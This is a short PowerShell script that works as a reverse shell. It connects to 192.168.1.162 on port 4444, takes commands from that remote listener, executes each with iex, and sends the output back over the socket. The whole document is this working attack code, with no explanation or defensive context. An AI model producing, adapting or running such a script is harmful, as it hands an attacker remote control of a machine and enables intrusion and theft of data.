$LHOST = "192.168.1.162"
$LPORT = 4444
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)
$NetworkStream = $TCPClient.GetStream()
$StreamReader = New-Object IO.StreamReader($NetworkStream)
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
$StreamWriter.AutoFlush = $true
$Buffer = New-Object System.Byte[] 1024
while ($TCPClient.Connected) {
    while ($NetworkStream.DataAvailable) {
        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
        $Code = ([Text.Encoding]::UTF8).GetString($Buffer, 0, $RawData)
        $Output = (iex $Code 2>&1 | Out-String)
        $StreamWriter.Write($Output)
    }
    Start-Sleep -Milliseconds 100
}
